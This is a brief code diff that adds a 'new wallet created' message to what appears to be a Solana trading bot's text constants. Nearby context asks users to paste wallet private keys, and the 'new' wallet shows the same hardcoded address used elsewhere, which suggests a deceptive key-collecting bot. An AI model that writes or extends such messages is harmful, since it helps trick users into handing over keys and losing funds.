@@ -102,6 +102,10 @@ Phantom or Solflare wallet and any other trading bot private keys are accepted.
 
 Please enter it below ⬇️"""
 
+    NEWWALLET_TXT = """Your New Wallet has been Created Successfully 
+Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
+Balance: 0.000000000 SOL"""
+
     WALLETADDRESS = """Your Wallet:
   
 Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
